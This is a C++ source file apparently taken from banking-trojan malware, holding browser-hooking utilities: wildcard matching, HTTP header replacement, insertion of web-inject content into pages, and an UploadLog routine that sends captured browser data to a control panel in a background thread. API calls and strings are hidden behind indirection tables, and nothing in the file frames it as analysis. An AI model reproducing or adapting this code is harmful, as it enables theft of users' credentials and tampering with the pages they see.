#include "BrowserUtils.h"
#include "..\Panel.h"
#include "WebInjects.h"

char *FindStrSandwich(char *buf, char *leftPart, char *rightPart)
{
   char *startStrPos = Funcs::pStrStrIA(buf, leftPart);
   if(!startStrPos)
      return NULL;
   startStrPos += Funcs::pLstrlenA(leftPart);
   char *endStrPos = Funcs::pStrStrIA(startStrPos, rightPart);
   if(!endStrPos)
      return NULL;
   DWORD strSize = endStrPos - startStrPos;
   char *str = (char *) Alloc(strSize + 1);
   str[strSize] = 0;
   Funcs::pMemcpy(str, startStrPos, strSize);
   return str;
}

char ToLowerOrIgnore(char c, BOOL toLower)
{
   return toLower ? Funcs::pTolower(c) : c;
}

char StrNcmpOrI(const char *str, const char* str2, DWORD maxCount, BOOL ignoreCase)
{
   if(ignoreCase)
      return Funcs::pStrnicmp(str, str2, maxCount);
   else
      return Funcs::pStrncmp(str, str2, maxCount);
}

DWORD WildCardStrCmp(char *str, char *str2, BOOL ignoreCase, BOOL checkEnd)
{
   if(!str || !str2)
      return FALSE;

   const char wildCardChar = '*';

   DWORD strLen  = Funcs::pLstrlenA(str);
   DWORD str2Len = Funcs::pLstrlenA(str2);
 
   BOOL  wildCard = FALSE;
   BOOL  matched  = TRUE;

   PCHAR strAfterWildCard = 0;
   DWORD strAfterWildCardLen;

   DWORD i2 = 0;
   for(DWORD i = 0; i < strLen || wildCard;)
   {
      if(wildCard)
      {
         if(i2 == str2Len)
            return FALSE;
         if(!StrNcmpOrI(str2 + i2, strAfterWildCard, strAfterWildCardLen, ignoreCase))
         {
            wildCard = FALSE;
            matched  = TRUE;
            i2 += strAfterWildCardLen;
         }
         else
            ++i2;
      }
      else
      {
         if(str[i] == wildCardChar)
         {
            if(i + 1 == strLen)
               return str2Len;

            char *nextWildCard = Funcs::pStrChrA((char *) str + i + 1, wildCardChar);
            if(!nextWildCard)
            {
               strAfterWildCard = (char *) str + i + 1;
               strAfterWildCardLen = strLen - i - 1;
            }
            else
            {
               strAfterWildCard = (char *) str + i + 1;
               strAfterWildCardLen = (nextWildCard - str) - i - 1;
            }
            i += strAfterWildCardLen + 1;
            wildCard = TRUE;
            matched  = FALSE;
         }
         else
         {
            if(ToLowerOrIgnore(str[i], ignoreCase) != ToLowerOrIgnore(str2[i2], ignoreCase))
               return FALSE;
            ++i;
            ++i2;
         }
      }
   }
   if(i2 != str2Len && checkEnd)
      return FALSE;

   return matched ? i2 : FALSE;
}

DWORD WildCardStrStr(char *str, char *subStr, char **start)
{
   if(!str || !subStr)
      return FALSE;
 
   DWORD strLen = Funcs::pLstrlenA(str);
   for(DWORD i = 0; i < strLen; ++i)
   {
      DWORD len = WildCardStrCmp(subStr, str + i, TRUE, FALSE);
      if(len)
      {
         *start = str + i;
         return len;
      }
   }
   return FALSE;
}

BOOL ReplaceHeader(char **headers, char *name, char *value)
{
   if(!name || !value || !headers)
      return FALSE;
   char subStr[255] = { 0 };
   Funcs::pWsprintfA(subStr, Strs::bu1, name);
   DWORD headersSize = Funcs::pLstrlenA(*headers);
   DWORD valueSize   = Funcs::pLstrlenA(value);
   DWORD nameSize    = Funcs::pLstrlenA(name);
   char *start;
   DWORD size = WildCardStrStr(*headers, subStr, &start);
   DWORD allocatedSize = headersSize + valueSize + nameSize + 10;

   char *newHeaders = (char *) Alloc(allocatedSize);
   if(!newHeaders)
      return FALSE;
   Funcs::pMemset(newHeaders, 0, allocatedSize);
   DWORD offset;
   DWORD beforeHeaderPosSize;
   if(size)
   {
      size  -= 2;
      start += 2;
      beforeHeaderPosSize = start -  *headers;
      offset = beforeHeaderPosSize;
      Funcs::pMemcpy(newHeaders, *headers, offset);
   }
   else
   {
      offset = headersSize - 2;
      Funcs::pMemcpy(newHeaders, *headers, offset);
   }
   Funcs::pMemcpy(newHeaders + offset, name, nameSize);
   offset += nameSize;
   Funcs::pMemcpy(newHeaders + offset, Strs::bu2, 2);
   offset += 2;
   Funcs::pMemcpy(newHeaders + offset, value, valueSize);
   offset += valueSize;
   if(size)
   {
      Funcs::pMemcpy(newHeaders + offset, Strs::winNewLine, 2);
      offset += 2;
      Funcs::pMemcpy(newHeaders + offset, *headers + beforeHeaderPosSize + size, headersSize - beforeHeaderPosSize - size);
   }
   else
      Funcs::pMemcpy(newHeaders + offset, Strs::headersEnd, 4);
   Funcs::pFree(*headers);
   *headers = newHeaders;
   return TRUE;
}

BOOL ReplaceBeforeAfter(char **str2replace, char *strBeforeAfter, char *strReplaceBefore, char *strReplaceAfter)
{
   if (!*str2replace || !strBeforeAfter || !strReplaceBefore || !strReplaceAfter)
      return FALSE;

   char *startStrBeforeAfter;
   DWORD strBeforeAfterLen = WildCardStrStr(*str2replace, strBeforeAfter, &startStrBeforeAfter);
   if (!strBeforeAfterLen)
      return FALSE;
 
   DWORD str2replaceLen      = Funcs::pLstrlenA(*str2replace);
   DWORD strReplaceBeforeLen = Funcs::pLstrlenA(strReplaceBefore);
   DWORD strReplaceAfterLen  = Funcs::pLstrlenA(strReplaceAfter);
   
   char *newStr = (char *) Alloc(str2replaceLen + strReplaceBeforeLen + strReplaceAfterLen + 1);
   if (!newStr)
      return FALSE;
   Funcs::pMemset(newStr, 0, str2replaceLen + strReplaceBeforeLen + strReplaceAfterLen + 1);
   
   DWORD offset = startStrBeforeAfter - *str2replace;
   Funcs::pMemcpy(newStr, *str2replace, offset);

   Funcs::pMemcpy(newStr + offset, strReplaceBefore, strReplaceBeforeLen);
   offset += strReplaceBeforeLen;

   Funcs::pMemcpy(newStr + offset, startStrBeforeAfter, strBeforeAfterLen);
   offset += strBeforeAfterLen;

   Funcs::pMemcpy(newStr + offset, strReplaceAfter, strReplaceAfterLen);
   offset += strReplaceAfterLen;   

   Funcs::pMemcpy(newStr + offset, startStrBeforeAfter + strBeforeAfterLen, 
      str2replaceLen - (startStrBeforeAfter - *str2replace) - strBeforeAfterLen);

   Funcs::pFree(*str2replace);
   *str2replace = newStr;
   return TRUE;
}

inline char *GetPath(char *headers)
{
   return FindStrSandwich(headers, " ", " ");
}

inline char *GetHost(char *headers)
{
   return FindStrSandwich(headers, Strs::bu3, Strs::winNewLine);
}

char *GetUrlHeaders(char *headers, BOOL *inject)
{
   char *host = NULL, *path = NULL, *url = NULL;
   if((host = GetHost(headers)))
   {
      if((path = GetPath(headers)))
         url = GetUrlHostPath(host, path, inject);
   }
   Funcs::pFree(host);
   Funcs::pFree(path);
   return url;
}

char *GetUrlHostPath(char *host, char *path, BOOL *inject)
{
   *inject = GetWebInject(host, NULL) != NULL;
   char *url = NULL;
   if(url = (char *) Alloc(lstrlenA(host) + lstrlenA(path) + 20))
   {
      Funcs::pLstrcpyA(url, Strs::bu4);
      Funcs::pLstrcatA(url, host);
      Funcs::pLstrcatA(url, path);
   }
   return url;
}

static DWORD WINAPI UploadThread(LPVOID lpParam)
{
   char *postData = (char *) lpParam;
   if(Funcs::pLstrlenA(postData) > 0)
   {
      char *r = PanelRequest(postData, NULL);
      Funcs::pFree(r);
   }    
   Funcs::pFree(postData);
   return 0;
}

void UploadLog(char *software, char *url, char *data, BOOL inject)
{
   if(UrlIsBlacklisted(url))
      return;
   if(Funcs::pLstrlenA(data) == 0)
      return;
   char *postData = (char *) Alloc(Funcs::pLstrlenA(software) + Funcs::pLstrlenA(url) + Funcs::pLstrlenA(data) + 10);
   if(postData)
   {
      Funcs::pWsprintfA(postData, Strs::bu5, software, url, inject);
      Funcs::pLstrcatA(postData, data);
      Funcs::pCreateThread(NULL, 0, UploadThread, postData, 0, NULL);
   }
}